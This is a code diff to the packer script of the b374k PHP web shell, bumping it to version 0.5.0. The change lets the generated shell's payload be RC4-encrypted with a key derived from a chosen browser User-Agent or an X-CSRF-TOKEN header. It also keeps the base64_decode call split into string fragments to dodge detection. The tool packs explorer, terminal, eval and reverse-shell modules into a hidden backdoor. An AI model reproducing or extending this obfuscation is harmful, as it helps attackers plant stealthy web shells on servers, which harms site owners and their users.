@@ -10,7 +10,7 @@
 	https://github.com/phith0n/b374k
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.4.8";
+$GLOBALS['packer']['version'] = "0.5.0";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
@@ -20,7 +20,7 @@ $GLOBALS['packer']['network_rs_dir'] = "./network/rs/";
 $GLOBALS['packer']['resources_dir'] = "./resources/";
 
 $TRUST_USER_AGENT = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/64.0.3282.112 Mobile/15D60 Safari/604.1";
-$debug_rc4_key = md5($TRUST_USER_AGENT);
+$debug_rc4_key = md5('ua_' . $TRUST_USER_AGENT);
 $supported_network_rs_types = array('executable', 'gcc', 'java', 'php', 'python');
 
 require $GLOBALS['packer']['base_dir'].'jsPacker.php';
@@ -64,7 +64,7 @@ $css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
 $layout = packer_read_file($GLOBALS['packer']['base_dir']."layout.php");
 
 if(isset($_SERVER['REMOTE_ADDR'])){
-$GLOBALS['cipher_key'] = $debug_rc4_key;
+    $GLOBALS['cipher_key'] = $debug_rc4_key;
     if(isset($_GET['run'])){
         if(empty($_GET['run'])) $modules = array();
         else $modules = explode("," ,$_GET['run']);
@@ -119,6 +119,10 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
 		$compress = trim($p['compress']);
 		$compress_level = (int) $p['compress_level'];
 		$encode = addslashes(trim($p['encode']));
+
+		if($compress == 'rc4' && isset($p['user_agent']) && strlen(trim($p['user_agent'])) > 0) {
+            $GLOBALS['cipher_key'] = md5('ua_' . trim($p['user_agent']));
+        }
 
 		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
 
@@ -226,6 +230,7 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
 					<option selected="selected">9</option>
 				</select>
 			</td></tr>
+            <tr id="user_agent_line"><td>Trust User Agent</td><td><input type='text' id='user_agent' value='<?php echo $_SERVER['HTTP_USER_AGENT'];?>'></td></tr>
 			<tr><td style='width:220px;'>Encode</td><td><input id='encode' type='text' value='utf-8'></td></tr>
 
 			<tr><td colspan='2'>
@@ -256,6 +261,21 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
 		$('#base64').on('change', function(e){
 			refresh_row();
 		});
+        $('#compress').on('change', function(e){
+            var c = $(this).val();
+            var cl = $('#compress_level');
+            if(c === 'no') {
+                cl.hide();
+            } else {
+                cl.show();
+            }
+            var ua = $('#user_agent_line');
+            if(c !== 'rc4') {
+                ua.hide();
+            } else {
+                ua.show();
+            }
+        });
 
 		$('#packGo').on('click', function(e){
 			var outputfile = $('#outputfile').val();
@@ -266,29 +286,35 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
             var compress = $('#compress').val();
             var compress_level = $('#compress_level').val();
             var encode = $('#encode').val();
+            var user_agent = $('#user_agent').val();
 
-			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level, encode:encode}, function(res){
+			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level, encode:encode, user_agent:user_agent}, function(res){
 				var splits = res.split('{[|a374k|]}');
 				$('#resultContent').html(splits[1]);
 				$('#result').html(splits[0]);
 			});
 
 		});
-		
-		$('.theme').on('change', function(e){
-			$('.theme').val($(this).val());
-			set_cookie('packer_theme', $('.theme').val());
+
+		var tm = $('.theme');
+		tm.on('change', function(e){
+            tm.val($(this).val());
+			set_cookie('packer_theme', tm.val());
 			location.href = targeturl;
 		});
 	});
 
 	function refresh_row(){
-        var base64 = $('#base64').val();
-		if(base64=='yes'){
+        var b = $('#base64').val();
+        var ua = $('#user_agent_line');
+		if(b==='yes'){
 			$('#compress_row').show();
+            $('#compress').val('rc4');
+            ua.show();
 		}else{
 			$('#compress_row').hide();
 			$('#compress').val('no');
+            ua.hide();
 		}
 	}
 
@@ -659,7 +685,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = base64_encode($content);
 		if($compress!='no'){
 			if($compress=="rc4") {
-				$encoder = $bds."(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:md5(\$_SERVER[\\'HTTP_USER_AGENT\\']),ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
+				$encoder = $bds."(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:md5(\\'ua_\\'.\$_SERVER[\\'HTTP_USER_AGENT\\']),ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
 			} else {
 				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			}
